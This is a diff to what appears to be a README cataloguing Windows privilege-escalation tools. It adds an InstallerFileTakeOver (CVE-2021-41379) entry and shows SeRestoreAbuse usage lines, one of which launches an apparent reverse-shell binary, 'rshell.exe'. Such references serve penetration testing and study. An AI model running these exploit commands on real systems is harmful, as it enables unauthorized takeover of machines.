@@ -109,8 +109,15 @@ RemotePotato0.exe -m 3 -l 9997
  
  ### SeRestoreAbuse.exe
 
-* **xct** - *Windows Privesc* - [SeRestoreAbuse](https://github.com/xct/SeRestoreAbuse)
+* **xct** - *Abuse SeRestorePriviledge* - [SeRestoreAbuse](https://github.com/xct/SeRestoreAbuse)
 ```
 SeRestoreAbuse.exe "cmd /c ..."
 SeRestoreAbuse.exe "cmd /c C:\temp\rshell.exe"
+ ```
+
+### InstallerFileTakeOver.exe x64 version
+
+* **klinix5** - *CVE-2021-41379* - [InstallerFileTakeOver](https://github.com/klinix5/InstallerFileTakeOver)
+```
+InstallerFileTakeOver.exe <file-to-takeover>
  ```
